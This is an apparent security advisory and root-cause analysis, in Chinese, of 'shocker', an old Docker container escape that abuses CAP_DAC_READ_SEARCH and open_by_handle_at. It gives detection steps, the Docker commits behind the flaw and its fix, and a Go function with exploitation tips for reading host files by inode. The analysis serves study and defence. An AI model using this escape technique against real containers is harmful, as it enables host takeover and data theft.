#  docker历史上的第一个漏洞：关于shocker的一切   
原创 王磊  华为安全应急响应中心   2024-12-03 10:10  
  
**1**  
  
**基本信息**  
  
  
<table><tbody style="box-sizing: border-box;"><tr opera-tn-ra-comp="_$.pages:0.layers:0.comps:1.col1:0.classicTable1:0" style="box-sizing: border-box;"><td colspan="1" rowspan="1" opera-tn-ra-cell="_$.pages:0.layers:0.comps:1.col1:0.classicTable1:0.td@@0" style="border-width: 1px;border-color: rgb(62, 62, 62);border-style: solid;background-color: rgb(234, 241, 251);margin: 0px 0px 0px 10px;padding: 0px;box-sizing: border-box;" width="27.0000%"><section style="margin: 5px 0%;box-sizing: border-box;"><section style="text-align: justify;padding: 0px 5px;box-sizing: border-box;"><p style="text-align: center;white-space: normal;margin: 0px;padding: 0px;box-sizing: border-box;">Item</p></section></section></td><td colspan="1" rowspan="1" opera-tn-ra-cell="_$.pages:0.layers:0.comps:1.col1:0.classicTable1:0.td@@1" style="border-width: 1px;border-color: rgb(62, 62, 62);border-style: solid;background-color: rgb(234, 241, 251);box-sizing: border-box;padding: 0px;" width="53.0000%"><section style="margin: 5px 0%;box-sizing: border-box;"><section style="text-align: center;padding: 0px 5px;box-sizing: border-box;"><p style="margin: 0px;padding: 0px;box-sizing: border-box;">Details</p></section></section></td><td colspan="1" rowspan="1" opera-tn-ra-cell="_$.pages:0.layers:0.comps:1.col1:0.classicTable1:0.td@@2" style="border-width: 1px;border-color: rgb(62, 62, 62);border-style: solid;background-color: rgb(234, 241, 251);margin: 0px;box-sizing: border-box;padding: 0px;" width="20.0000%"><section style="margin: 5px 0%;box-sizing: border-box;"><section style="text-align: center;padding: 0px 5px;box-sizing: border-box;"><p style="margin: 0px;padding: 0px;box-sizing: border-box;">Note</p></section></section></td></tr><tr opera-tn-ra-comp="_$.pages:0.layers:0.comps:1.col1:0.classicTable1:1" style="box-sizing: border-box;"><td colspan="1" rowspan="1" opera-tn-ra-cell="_$.pages:0.layers:0.comps:1.col1:0.classicTable1:1.td@@0" style="border-width: 1px;border-color: rgb(62, 62, 62);border-style: solid;box-sizing: border-box;padding: 0px;" width="27.0000%"><section style="text-align: justify;padding: 0px 5px;box-sizing: border-box;"><p style="text-align: center;white-space: normal;margin: 0px;padding: 0px;box-sizing: border-box;">Project</p></section></td><td colspan="1" rowspan="1" opera-tn-ra-cell="_$.pages:0.layers:0.comps:1.col1:0.classicTable1:1.td@@1" style="border-width: 1px;border-color: rgb(62, 62, 62);border-style: solid;box-sizing: border-box;padding: 0px;" width="53.0000%"><section style="margin: 5px 0%;box-sizing: border-box;"><section style="text-align: center;padding: 0px 5px;box-sizing: border-box;"><p style="margin: 0px;padding: 0px;box-sizing: border-box;">docker</p></section></section></td><td colspan="1" rowspan="1" opera-tn-ra-cell="_$.pages:0.layers:0.comps:1.col1:0.classicTable1:1.td@@2" style="border-width: 1px;border-color: rgb(62, 62, 62);border-style: solid;box-sizing: border-box;padding: 0px;" width="20.0000%"><section style="margin: 5px 0%;box-sizing: border-box;"><section style="text-align: center;padding: 0px 5px;box-sizing: border-box;"><p style="margin: 0px;padding: 0px;box-sizing: border-box;">—</p></section></section></td></tr><tr opera-tn-ra-comp="_$.pages:0.layers:0.comps:1.col1:0.classicTable1:2" style="box-sizing: border-box;"><td colspan="1" rowspan="1" opera-tn-ra-cell="_$.pages:0.layers:0.comps:1.col1:0.classicTable1:2.td@@0" style="border-width: 1px;border-color: rgb(62, 62, 62);border-style: solid;box-sizing: border-box;padding: 0px;" width="27.0000%"><section style="margin: 5px 0%;box-sizing: border-box;"><section style="text-align: justify;padding: 0px 5px;box-sizing: border-box;"><p style="text-align: center;white-space: normal;margin: 0px;padding: 0px;box-sizing: border-box;">CVE-ID</p></section></section></td><td colspan="1" rowspan="1" opera-tn-ra-cell="_$.pages:0.layers:0.comps:1.col1:0.classicTable1:2.td@@1" style="border-width: 1px;border-color: rgb(62, 62, 62);border-style: solid;box-sizing: border-box;padding: 0px;" width="53.0000%"><section style="margin: 5px 0%;box-sizing: border-box;"><section style="text-align: center;padding: 0px 5px;box-sizing: border-box;"><p style="margin: 0px;padding: 0px;box-sizing: border-box;">CVE-2014-3519(OpenVZ)</p></section></section></td><td colspan="1" rowspan="1" opera-tn-ra-cell="_$.pages:0.layers:0.comps:1.col1:0.classicTable1:2.td@@2" style="border-width: 1px;border-color: rgb(62, 62, 62);border-style: solid;box-sizing: border-box;padding: 0px;" width="20.0000%"><section style="text-align: center;padding: 0px 5px;box-sizing: border-box;"><p style="margin: 0px;padding: 0px;box-sizing: border-box;">公开时docker已部分修复，未分配CVE</p></section></td></tr><tr opera-tn-ra-comp="_$.pages:0.layers:0.comps:1.col1:0.classicTable1:3" style="box-sizing: border-box;"><td colspan="1" rowspan="1" opera-tn-ra-cell="_$.pages:0.layers:0.comps:1.col1:0.classicTable1:3.td@@0" style="border-width: 1px;border-color: rgb(62, 62, 62);border-style: solid;box-sizing: border-box;padding: 0px;" width="27.0000%"><section style="text-align: justify;padding: 0px 5px;box-sizing: border-box;"><p style="text-align: center;white-space: normal;margin: 0px;padding: 0px;box-sizing: border-box;">Vuln&#39;s Author</p></section></td><td colspan="1" rowspan="1" opera-tn-ra-cell="_$.pages:0.layers:0.comps:1.col1:0.classicTable1:3.td@@1" style="border-width: 1px;border-color: rgb(62, 62, 62);border-style: solid;box-sizing: border-box;padding: 0px;" width="53.0000%"><section style="text-align: justify;padding: 0px 5px;box-sizing: border-box;"><p style="text-align: center;white-space: normal;margin: 0px;padding: 0px;box-sizing: border-box;">Sebastian Krahmer</p></section></td><td colspan="1" rowspan="1" opera-tn-ra-cell="_$.pages:0.layers:0.comps:1.col1:0.classicTable1:3.td@@2" style="border-width: 1px;border-color: rgb(62, 62, 62);border-style: solid;box-sizing: border-box;padding: 0px;" width="20.0000%"><section style="text-align: justify;padding: 0px 5px;box-sizing: border-box;"><p style="text-align: center;white-space: normal;margin: 0px;padding: 0px;box-sizing: border-box;">—</p></section></td></tr><tr opera-tn-ra-comp="_$.pages:0.layers:0.comps:1.col1:0.classicTable1:4" style="box-sizing: border-box;"><td colspan="1" rowspan="1" opera-tn-ra-cell="_$.pages:0.layers:0.comps:1.col1:0.classicTable1:4.td@@0" style="border-width: 1px;border-color: rgb(62, 62, 62);border-style: solid;box-sizing: border-box;padding: 0px;" width="27.0000%"><section style="text-align: justify;padding: 0px 5px;box-sizing: border-box;"><p style="text-align: center;white-space: normal;margin: 0px;padding: 0px;box-sizing: border-box;">CVSS</p></section></td><td colspan="1" rowspan="1" opera-tn-ra-cell="_$.pages:0.layers:0.comps:1.col1:0.classicTable1:4.td@@1" style="border-width: 1px;border-color: rgb(62, 62, 62);border-style: solid;box-sizing: border-box;padding: 0px;" width="53.0000%"><section style="text-align: justify;padding: 0px 5px;box-sizing: border-box;"><p style="text-align: center;white-space: normal;margin: 0px;padding: 0px;box-sizing: border-box;">9.3CVSS:3.1/AV:L/AC:L/PR:N</p><p style="text-align: center;white-space: normal;margin: 0px;padding: 0px;box-sizing: border-box;">/UI:N/S:C/C:H/I:H/A:H</p></section></td><td colspan="1" rowspan="1" opera-tn-ra-cell="_$.pages:0.layers:0.comps:1.col1:0.classicTable1:4.td@@2" style="border-width: 1px;border-color: rgb(62, 62, 62);border-style: solid;box-sizing: border-box;padding: 0px;" width="20.0000%"><section style="text-align: justify;padding: 0px 5px;box-sizing: border-box;"><p style="text-align: center;white-space: normal;margin: 0px;padding: 0px;box-sizing: border-box;">byssst0n3</p></section></td></tr><tr opera-tn-ra-comp="_$.pages:0.layers:0.comps:1.col1:0.classicTable1:5" style="box-sizing: border-box;"><td colspan="1" rowspan="1" opera-tn-ra-cell="_$.pages:0.layers:0.comps:1.col1:0.classicTable1:5.td@@0" style="border-width: 1px;border-color: rgb(62, 62, 62);border-style: solid;box-sizing: border-box;padding: 0px;" width="27.0000%"><section style="text-align: justify;padding: 0px 5px;box-sizing: border-box;"><p style="text-align: center;white-space: normal;margin: 0px;padding: 0px;box-sizing: border-box;">Affect Version</p></section></td><td colspan="1" rowspan="1" opera-tn-ra-cell="_$.pages:0.layers:0.comps:1.col1:0.classicTable1:5.td@@1" style="border-width: 1px;border-color: rgb(62, 62, 62);border-style: solid;box-sizing: border-box;padding: 0px;" width="53.0000%"><section style="text-align: justify;padding: 0px 5px;box-sizing: border-box;"><p style="text-align: center;white-space: normal;margin: 0px;padding: 0px;box-sizing: border-box;"><span style="box-sizing: border-box;">&lt;= v1.0.0</span><br style="box-sizing: border-box;"/></p></section></td><td colspan="1" rowspan="1" opera-tn-ra-cell="_$.pages:0.layers:0.comps:1.col1:0.classicTable1:5.td@@2" style="border-width: 1px;border-color: rgb(62, 62, 62);border-style: solid;box-sizing: border-box;padding: 0px;" width="20.0000%"><section style="text-align: center;padding: 0px 5px;box-sizing: border-box;"><p style="margin: 0px;padding: 0px;box-sizing: border-box;">v0.12.0和v1.0.0仅在使用lxc时受影响</p></section></td></tr><tr opera-tn-ra-comp="_$.pages:0.layers:0.comps:1.col1:0.classicTable1:6" style="box-sizing: border-box;"><td colspan="1" rowspan="1" opera-tn-ra-cell="_$.pages:0.layers:0.comps:1.col1:0.classicTable1:6.td@@0" style="border-width: 1px;border-color: rgb(62, 62, 62);border-style: solid;box-sizing: border-box;padding: 0px;" width="27.0000%"><section style="text-align: justify;padding: 0px 5px;box-sizing: border-box;"><p style="text-align: center;white-space: normal;margin: 0px;padding: 0px;box-sizing: border-box;">Fix Version</p></section></td><td colspan="1" rowspan="1" opera-tn-ra-cell="_$.pages:0.layers:0.comps:1.col1:0.classicTable1:6.td@@1" style="border-width: 1px;border-color: rgb(62, 62, 62);border-style: solid;box-sizing: border-box;padding: 0px;" width="53.0000%"><section style="text-align: justify;padding: 0px 5px;box-sizing: border-box;"><p style="text-align: center;white-space: normal;margin: 0px;padding: 0px;box-sizing: border-box;"><span style="text-align: justify;box-sizing: border-box;">v1.0.1</span><br style="box-sizing: border-box;"/></p></section></td><td colspan="1" rowspan="1" opera-tn-ra-cell="_$.pages:0.layers:0.comps:1.col1:0.classicTable1:6.td@@2" style="border-width: 1px;border-color: rgb(62, 62, 62);border-style: solid;box-sizing: border-box;padding: 0px;" width="20.0000%"><section style="text-align: justify;padding: 0px 5px;box-sizing: border-box;"><p style="text-align: center;white-space: normal;margin: 0px;padding: 0px;box-sizing: border-box;">—</p></section></td></tr></tbody></table>  
  
  
**2**  
  
**组件简介**  
  
  
**Docker Capability**  
  
在 Docker 容器中，capabilities 允许你控制容器可以执行哪些权限较高的操作，而无需赋予它完整的 root 权限。这有助于增强安全性，因为即使容器被危害，其破坏范围也因受限的权限而被限制。  
  
在 Linux 系统中，capabilities 将传统的 root 权限分解为更小、更具体的权限单元。例如，  
CAP_NET_ADMIN 允许进行网络配置，而   
CAP_CHOWN 允许改变文件的所有者。  
  
当运行一个 Docker 容器时，默认情况下，它不会具有宿主机上 root 用户的所有权限。Docker 使用一组默认的 capabilities 集合来提供必要的权限，同时限制其他可能会带来安全风险的权限。  
  
使用  
 --cap-add 选项可以赋予容器额外的 capabilities。例如，如果想让容器能够管理网络接口，可以添加   
NET_ADMIN capability：  
```
docker run --cap-add=NET_ADMIN myimage
```  
  
使用   
--cap-drop 选项可以移除容器的某些 capabilities。如果想阻止容器改变文件所有权，可以删除   
CHOWN capability：  
```
docker run --cap-drop=CHOWN myimage
```  
  
  
**3**  
  
**漏洞详情**  
  
  
**漏洞影响**  
  
![](https://mmbiz.qpic.cn/mmbiz_svg/00GYaClAoOoLicicKhY2KCpwMXmflWClIErOYnjJiaSXvgNQOvibLI9MsNbUg8m3qqYzvmPicQv7a6DXEPZKYXeNlTAqUdCruVzRc/640?wx_fmt=svg&from=appmsg "")  
  
**范围**  
  
- <= v0.11.1, 使用native 和 lxc作为execdriver 均受影响  
  
- v0.12.0, v1.0.0, 在手动设置execdriver 为 lxc时受影响  
  
  
  
![](https://mmbiz.qpic.cn/mmbiz_svg/00GYaClAoOoLicicKhY2KCpwMXmflWClIErOYnjJiaSXvgNQOvibLI9MsNbUg8m3qqYzvmPicQv7a6DXEPZKYXeNlTAqUdCruVzRc/640?wx_fmt=svg&from=appmsg "")  
  
**利用场景**  
  
存在 CAP_DAC_READ_SEARCH 可读写主机任意文件，进而容器逃逸。  
  
该Cap主要提供了根据文件句柄查找文件的能力，是极高危的权限，因Capability黑白名单使用策略而引入，修复后即默认不存在，实践中基本不会使用。  
  
在用户使用特权容器或全量Capability时，尽管逃逸方法众多，但将shocker漏洞作为一种利用技术，因其利用简单、稳定的特点，则可以发挥很大作用。  
  
**漏洞防御**  
  
![](https://mmbiz.qpic.cn/mmbiz_svg/00GYaClAoOoLicicKhY2KCpwMXmflWClIErOYnjJiaSXvgNQOvibLI9MsNbUg8m3qqYzvmPicQv7a6DXEPZKYXeNlTAqUdCruVzRc/640?wx_fmt=svg&from=appmsg "")  
  
**存在性检测**  
  
通过查看 /proc/1/status 的 CapBnd 字段检查漏洞是否存在。  
  
可以使用   
ctrsploit checksec shocker 命令实现  
```
root@e33b98bef3c3:/# ctrsploit --colorful checksec shocker✔  shocker      # Container escape with CAP_DAC_READ_SEARCH, alias shocker, found by Sebastian Krahmer (stealth) in 2014.
```  
  
规避漏洞的措施为移除 CAP_DAC_READ_SEARCH。  
  
![](https://mmbiz.qpic.cn/mmbiz_svg/00GYaClAoOoLicicKhY2KCpwMXmflWClIErOYnjJiaSXvgNQOvibLI9MsNbUg8m3qqYzvmPicQv7a6DXEPZKYXeNlTAqUdCruVzRc/640?wx_fmt=svg&from=appmsg "")  
  
**利用检测**  
  
检查 open_by_handle_at 系统调用。  
  
  
**4**  
  
**漏洞原始特性**  
  
  
docker 默认使用用的 CAP_DAC_READ_SEARCH,可以调用 open_by_handle_at 读取主机任意文件，实现容器逃逸。  
  
**Capability**  
  
在 Linux 系统中，Capability 是一种细粒度的权限控制机制，用于区分进程的特权。传统上，Unix 和类 Unix 系统上的进程要么是非特权的（普通用户权限），要么是超级用户权限（root）。这种“全有或全无”的权限模型会带来安全风险，因为拥有 root 权限的进程可以执行任何操作。  
  
为了解决这个问题，Linux 引入了 Capability 划分，把传统的 root 权限细分为一系列独立的权限，比如操作网络接口、更改系统时间等。通过这种方式，可以将必要的最小权限赋给进程，降低系统遭受恶意软件或操作失误影响的风险。  
  
默认情况下，容器并不运行在完全的 root 环境下，而是受限于一组默认的 Capability，这些 Capability 限制了容器内部进程的权限。这意味着即使容器内的进程以 root 用户运行，它也只能执行那些被明确授权的操作。例如，一个容器可能没有权限修改宿主机的网络配置或直接访问硬件设备。  
  
runtime 允许用户在启动容器时自定义 Capability。你可以添加额外的权限，以支持特定的功能，或者删除默认权限，以进一步加强安全性。这种灵活性在保持容器功能性的同时，也帮助实现了最小权限原则，减少了潜在的安全风险。  
  
**CAP_DAC_READ_SEARCH**  
  
1. 基础权限检查：generic_permission: 覆盖部分DAC  
  
2. open_by_handle_at (syscall): 根据inode打开指定文件系统下的文件  
  
3. link: 在路径为空仅有fd的情况下创建硬链接  
- 3.1 linkat (syscall)  
  
- 3.2 link (syscall)  
  
- 3.3 io_linkat (io_uring)  
  
4. overlayfs: 一些内部函数实现了inode到path的查询  
  
5. btrfs: BTRFS_IOC_INO_PATHS ioctl, 实现inode到path的查询  
  
**open_by_handle_at**  
  
open_by_handle_at 是 Linux 系统中的一个系统调用，其主要用途是根据文件句柄（file handle）打开一个文件, 文件句柄可以由 inode number 组成。使用 open_by_handle_at 需要 CAP_DAC_READ_SEARCH 。  
```
int open_by_handle_at(int mount_fd, struct file_handle *handle, int flags);
```  
  
  
**5**  
  
**漏洞复现**  
  
  
以docker v0.12.0 (execdriver)为例  
  
ssst0n3/docker_archive:shocker_docker-v0.12.0-lxc  
  
```
$ git clone https://github.com/ssst0n3/docker_archive.git
$ cd docker_archive/vul/shocker/shocker_docker-v1.0.0-lxc
$ docker compose -f docker-compose.yml -f docker-compose.kvm.yml up -d
$ ./ssh
root@localhost:~# docker version
Client version: 1.0.0
Client API version: 1.12
Go version (client): go1.2.1
Git commit (client): 63fe64c
Server version: 1.0.0
Server API version: 1.12
Go version (server): go1.2.1
Git commit (server): 63fe64c
root@localhost:~# lxc-start --version
1.0.10
```  
  
  
docker v1.0.0 在使用 lxc execdriver 时未修复，仍存在CAP_DAC_READ_SEARCH。  
  
```
root@localhost:~# ./poc.sh 
+ echo 'loading docker image, docker-v1.0.0 cannot pull images from registry v2 anymore.'
loading docker image, docker-v1.0.0 cannot pull images from registry v2 anymore.
+ docker load
+ docker run -ti busybox:1.36.1 grep Cap /proc/1/status
CapInh:0000000000000000
CapPrm:00000018984ceeff
CapEff:00000018984ceeff
CapBnd:00000018984ceeff
root@localhost:~# capsh --decode=00000018984ceeff
0x00000018984ceeff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_chroot,cap_sys_ptrace,cap_sys_boot,cap_mknod,cap_lease,cap_setfcap,cap_wake_alarm,cap_block_suspend
```  
  
  
  
**6**  
  
**漏洞分析**  
  
  
漏洞原理简单，拥有CAP_DAC_READ_SEARCH 即可调用 open_by_handle_at 系统调用，通过指定inode打开主机文件。本节主要分析漏洞如何利用。  
  
**open_by_handle_at**  
  
主要用途是在指定文件系统下打开文件句柄，只需要文件句柄信息不需要路径即可打开。  
  
int open_by_handle_at(int mount_fd, struct file_handle *handle, int flags);  
- mount_fd: 给定1个文件，将在文件所属的挂载点所属文件系统下查找和打开目标文件句柄  
  
- handle: 包含要打开文件的inode number的文件句柄  
  
- flags: 打开文件的选项  
  
- 返回打开的fd  
  
其中文件句柄结构体如下，其中 handle_type 似乎并无要求，可以是任意值，(可能取决于文件系统的实现)  
  
```
struct file_handle {
__u32 handle_bytes;
int handle_type;
/* file identifier */
unsigned char f_handle[];
};
```  
  
  
go 实现：  
  
```
/*
GetFd
inode: 欲打开文件的inode number
ref: 文件路径，open_by_handle_at 根据挂载点在其所属文件系统下打开文件句柄
return: 打开目标文件，返回fd
*/
func (v Vulnerability) GetFd(inode int, ref string) (fd int, err error) {
hostReference, err := syscall.Open(ref, syscall.O_RDONLY, 0)
if err != nil {
return
}
defer syscall.Close(hostReference)
inodeBytes := make([]byte, 8)
// 将 inode 转换为小端序的字节数组
binary.LittleEndian.PutUint64(inodeBytes, uint64(inode))
handle := unix.NewFileHandle(1, inodeBytes)
fd, err = unix.OpenByHandleAt(hostReference, handle, unix.O_RDONLY)
if err != nil {
return
}
return
}
```  
  
  
![](https://mmbiz.qpic.cn/mmbiz_svg/00GYaClAoOoLicicKhY2KCpwMXmflWClIErOYnjJiaSXvgNQOvibLI9MsNbUg8m3qqYzvmPicQv7a6DXEPZKYXeNlTAqUdCruVzRc/640?wx_fmt=svg&from=appmsg "")  
  
**reference**  
  
open_by_handle_at 系统调用的 mount_fd 参数通常为   
/etc/hosts 的fd, 由 k8s 或 docker 等容器组件挂载进容器内。  
  
但有时也需要通过该参数调整inode所属的文件系统。  
  
例如以下案例， /etc/hosts 挂载自  
 /dev/mapper/kubernetes, 则只能打开该文件系统下的inode。  
```
$cat /proc/self/mountinfo |grep host2297 2235 253:1 /containers/a70add2964af7d0891542a48578359192afcdb920c35260540c6d6da92fb1735/hostname /etc/hostname rw,nodev,noatime - ext4 /dev/mapper/docker rw,data=ordered2299 2235 253:0 /pods/0255d349-f826-4f52-9e37-fbc65e085fc8/etc-hosts /etc/hosts rw,noatime - ext4 /dev/mapper/kubernetes rw,data=ordered
```  
  
而通常 rootfs 位于类似 /dev/sda1 的文件系统， 则可尝试将mount_fd指定为   
/home/user/work 。  
```
$cat /proc/self/mountinfo |grep /dev/sd2291 2235 8:1 / /home/user/work rw,relatime - ext4 /dev/sda1 rw,data=ordered
```  
  
![](https://mmbiz.qpic.cn/mmbiz_svg/00GYaClAoOoLicicKhY2KCpwMXmflWClIErOYnjJiaSXvgNQOvibLI9MsNbUg8m3qqYzvmPicQv7a6DXEPZKYXeNlTAqUdCruVzRc/640?wx_fmt=svg&from=appmsg "")  
  
**inode**  
  
inode number通常可以设置为2 (每个文件系统的根目录的默认inode number)，也可以遍历匹配文件路径。  
  
**Read-only file system**  
  
有时成功逃逸到了主机的rootfs，但提示只读文件系统。  
```
root@0d792b99e7e0:/proc/self/fd/7# lsbin  boot  dev  etc  home  initrd.img  lib  lib32  lib64  lost+found  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var  vmlinuzroot@0d792b99e7e0:/proc/self/fd/7# touch 1touch: cannot touch '1': Read-only file system
```  
  
这是因为文件系统是只读挂载进容器的。如需要写操作，可以在利用 shocker 漏洞前   
mount -o remount,rw 重新挂载为 rw，或挑选rw挂载进容器的挂载点。  
  
**为什么容器的rootfs无法作为open_by_handle_at的mountfd参数？**  
  
**未测试过所有graphdriver, 结论仅对 overlayfs 有效。**  
  
exportfs_decode_fh_raw  
 函数使用文件系统提供的s_export_op->fh_to_dentry方法获取dentry。overlayfs 在设置了 config.nfs_export 时，会提供 s_export_op。而 overlayfs 默认情况下 nfs_export=N 。  
```
$ cat /sys/module/overlay/parameters/nfs_export N
```  
  
此外 nfs_export 还受 index, redirect_dir参数控制。尝试修改nfs_export启动容器，查看内核日志将发现：  
```
# echo 1 > /sys/module/overlay/parameters/nfs_export # dmesg -w...[1645601.879722] overlayfs: disabling nfs_export due to index=off[1645601.935631] overlayfs: NFS export requires "redirect_dir=nofollow" on non-upper mount, falling back to nfs_export=off....
```  
  
而且docker在挂载overlayfs时还主动设置了index=off  
  
```
func Init(home string, options []string, idMap idtools.IdentityMapping) (graphdriver.Driver, error) {
...
// figure out whether "index=off" option is recognized by the kernel
_, err = os.Stat("/sys/module/overlay/parameters/index")
switch {
case err == nil:
indexOff = "index=off,"
case os.IsNotExist(err):
// old kernel, no index -- do nothing
default:
logger.Warnf("Unable to detect whether overlay kernel module supports index parameter: %s", err)
}
...
}
```  
  
  
**其他潜在被利用风险**  
  
不同文件系统实现了其他从file handle 到 路径的查询，也存在潜在利用可能。  
  
  
**7**  
  
**漏洞引入分析**  
  
  
docker 早期将 runtime 称作 execdriver，本漏洞存在于 3 种 execdriver 中：  
- lxc: <= v0.7.1, commit a27b4b  
  
- lxc(dockerinit): v0.7.2 - v1.0.0, commit b8f1c7 (尽管 v0.9.0 切换了默认的 exedriver 为 native, 但仍可以手动指定为 lxc), v1.0.1修复  
  
- native: v0.9.0 - v0.11.1 , commit 2419e6 ,v0.12.0修复  
  
  
  
**lxc**  
  
第1个 commit a27b4b8 就采用了基于黑名单的 capability 设计  
  
```
const LxcTemplate = `
...
# drop linux capabilities (apply mainly to the user root in the container)
lxc.cap.drop = audit_control audit_write mac_admin mac_override mknod net_raw setfcap setpcap sys_admin sys_boot sys_module sys_nice sys_pacct sys_rawio sys_resource sys_time sys_tty_config
...
`
```  
  
  
**lxc(dockerinit)**  
  
commit b8f1c7 自 v0.7.2 起通过go代码实现了去除部分 capability 的功能, 不再通过lxc设置capabilty, 也使用黑名单机制。  
  
sysinit/sysinit.go  
  
```
func setupCapabilities(args *DockerInitArgs) error {


if args.privileged {
return nil
}


drop := []capability.Cap{
capability.CAP_SETPCAP,
capability.CAP_SYS_MODULE,
capability.CAP_SYS_RAWIO,
capability.CAP_SYS_PACCT,
capability.CAP_SYS_ADMIN,
capability.CAP_SYS_NICE,
capability.CAP_SYS_RESOURCE,
capability.CAP_SYS_TIME,
capability.CAP_SYS_TTY_CONFIG,
capability.CAP_MKNOD,
capability.CAP_AUDIT_WRITE,
capability.CAP_AUDIT_CONTROL,
capability.CAP_MAC_OVERRIDE,
capability.CAP_MAC_ADMIN,
}


c, err := capability.NewPid(os.Getpid())
if err != nil {
return err
}


c.Unset(capability.CAPS|capability.BOUNDS, drop...)


if err := c.Apply(capability.CAPS | capability.BOUNDS); err != nil {
return err
}
return nil
}
```  
  
  
**native**  
  
commit 2419e6 自 v0.9.0 起，引入了一种新的 execdriver, 叫作 libcontainer。  
  
runtime.go  
  
```
func NewRuntimeFromDirectory(config *DaemonConfig, eng *engine.Engine) (*Runtime, error) {
    ...
-   ed, err := lxc.NewDriver(config.Root, sysInfo.AppArmor)
+   ed, err := namespaces.NewDriver()
    ...
  runtime := &Runtime{
        ...
        execDriver:     ed,
        ...
    }
    ...
}
```  
  
  
execdriver/namespaces/driver.go  
  
```
+func (d *driver) Run(c *execdriver.Command, pipes *execdriver.Pipes, startCallback execdriver.StartCallback) (int, error) {
+   ...
+   container := createContainer(c)
+   ...
+}
...
+func createContainer(c *execdriver.Command) *libcontainer.Container {
+   container := getDefaultTemplate()
+   ...
+}
```  
  
  
在这个 execdriver 中，默认以黑名单的形式设置容器的 capability 。黑名单禁用了以下高危 capability：  
  
execdriver/namespaces/default_template.go  
  
```
func DropCapabilities(container *libcontainer.Container) error {
if drop := getCapabilities(container); len(drop) > 0 {
c, err := capability.NewPid(os.Getpid())
if err != nil {
return err
}
c.Unset(capability.CAPS|capability.BOUNDS, drop...)


if err := c.Apply(capability.CAPS | capability.BOUNDS); err != nil {
return err
}
}
return nil
}


func getCapabilities(container *libcontainer.Container) []capability.Cap {
drop := []capability.Cap{}
for _, c := range container.Capabilities {
drop = append(drop, capMap[c])
}
return drop
}
```  
  
  
此前， commit e8abaf 已经实现了 capability 的黑名单机制，这些函数在 init 或 exec 时会被执行。  
  
pkg/libcontainer/capabilities/capabilities.go  
```
func DropCapabilities(container *libcontainer.Container) error {
  if drop := getCapabilities(container); len(drop) > 0 {
    c, err := capability.NewPid(os.Getpid())
    if err != nil {
      return err
    }
    c.Unset(capability.CAPS|capability.BOUNDS, drop...)
 
    if err := c.Apply(capability.CAPS | capability.BOUNDS); err != nil {
      return err
    }
  }
  return nil
}
 
func getCapabilities(container *libcontainer.Container) []capability.Cap {
  drop := []capability.Cap{}
  for _, c := range container.Capabilities {
    drop = append(drop, capMap[c])
  }
  return drop
}
```  
  
  
**8**  
  
**漏洞修复分析**  
  
  
修复方法是将 capability 的黑名单机制修改为白名单。多位核心开发者都提到过该思想。  
- 2013-06-20, globalcitizen 在 PR #945 中在 lxc_template.go 中添加了一段注释, 提示了安全风险：  
  
  
  
```
# drop linux capabilities (apply mainly to the user root in the container)
+#  (Note: 'lxc.cap.keep' is coming soon and should replace this under the
+#         security principle 'deny all unless explicitly permitted', see
+#         http://sourceforge.net/mailarchive/message.php?msg_id=31054627 )
lxc.cap.drop = audit_control audit_write mac_admin mac_override mknod setfcap setpcap sys_admin sys_boot sys_module sys_nice sys_pacct sys_rawio sys_resource sys_time sys_tty_config
```  
  
- 2013-10-04, ewindisch 发起了 issue #2080 ， 讨论应启用默认拒绝原则：  
Rather than only supporting lxc.cap.drop, support should be added for lxc.cap.keep. This would enable the principle of deny-by-default, with an ability to granularly enable capabilities.  
  
- 2013-10-30, ewindisch 提交了 PR #2452, 提供了一种直接在 lxc_temaplate.go 中实现 capability 的白名单方法， 由用户通过cap选项来提供白名单列表。但因为lxc的版本兼容性问题而没有被合入。在这个PR的讨论中，jpetazzo, shykes, crosbymichael 建议需要开发一个抽象的 capability 集合，从而摆脱 lxc 语法和依赖。这成为了未来真正修复的思路。  
  
- 2013-12-13, tianon 在 PR #3015 提到：  
As an extra thought, couldn't we switch this to a whitelisting approach to caps, instead of the brunt blacklist we've got now (as we've wanted in the past but couldn't do due to LXC limitations)?  
  
- 2014-05-08, globalcitizen 提出 issue #5661, 指出当时的capability过于宽松  
  
- 2014-05-15, 为修复 issue#5661, vmarmol 在 PR #5810 设计了基于白名单的Capability  
  
- 2014-05-15, cyphar 在PR #5810 下提到过:   
+1. Whitelist > Blacklist.  
  
- 2014-05-17, PR#5810 合入到了 master 分支。  
  
但 PR#5810 仅修复了 native driver， lxc driver 在shocker漏洞公开后才 在 PR#6527 得到修复。  
  
![](https://mmbiz.qpic.cn/mmbiz_svg/00GYaClAoOoLicicKhY2KCpwMXmflWClIErOYnjJiaSXvgNQOvibLI9MsNbUg8m3qqYzvmPicQv7a6DXEPZKYXeNlTAqUdCruVzRc/640?wx_fmt=svg&from=appmsg "")  
  
**native**  
  
commit 9d6875 在 v0.12.0 修改了默认 capability, 由黑名单校验转为白名单。因此, cap_dac_read_search 被禁用了。  
  
pkg/libcontainer/security/capabilities/capabilities.go  
  
```
+// DropCapabilities drops all capabilities for the current process expect those specified in the container configuration.
 func DropCapabilities(container *libcontainer.Container) error {
-if drop := getCapabilitiesMask(container); len(drop) > 0 {
-c, err := capability.NewPid(os.Getpid())
-if err != nil {
-return err
-}
-c.Unset(capability.CAPS|capability.BOUNDS, drop...)
+c, err := capability.NewPid(os.Getpid())
+if err != nil {
+return err
+}


-if err := c.Apply(capability.CAPS | capability.BOUNDS); err != nil {
-return err
-}
+keep := getEnabledCapabilities(container)
+c.Clear(allCapabilityTypes)
+c.Set(allCapabilityTypes, keep...)
+
+if err := c.Apply(allCapabilityTypes); err != nil {
+return err
 }
 return nil
 }


-// getCapabilitiesMask returns the specific cap mask values for the libcontainer types
-func getCapabilitiesMask(container *libcontainer.Container) []capability.Cap {
-drop := []capability.Cap{}
+// getCapabilitiesMask returns the capabilities that should not be dropped by the container.
+func getEnabledCapabilities(container *libcontainer.Container) []capability.Cap {
+keep := []capability.Cap{}
 for key, enabled := range container.CapabilitiesMask {
-if !enabled {
+if enabled {
 if c := libcontainer.GetCapability(key); c != nil {
-drop = append(drop, c.Value)
+keep = append(keep, c.Value)
 }
 }
 }
-return drop
+return keep
 }
```  
  
  
daemon/execdriver/native/template/default_template.go  
  
```
func New() *libcontainer.Container {
container := &libcontainer.Container{
CapabilitiesMask: map[string]bool{
